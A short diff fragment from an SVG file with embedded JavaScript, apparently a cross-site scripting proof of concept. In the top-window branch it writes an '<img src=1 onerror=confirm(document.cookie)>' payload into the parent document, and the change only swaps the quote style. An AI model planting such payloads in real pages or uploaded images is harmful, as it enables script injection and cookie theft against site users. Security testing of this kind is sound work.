@@ -5,7 +5,7 @@
          console.log("child window");
       } else {  
          console.log("top window");
-          window.parent.document.write("<img src=1 onerror=confirm(document.cookie)>");  
+          window.parent.document.write('<img src=1 onerror=confirm(document.cookie)>');  
       }
    </script>
 </svg>
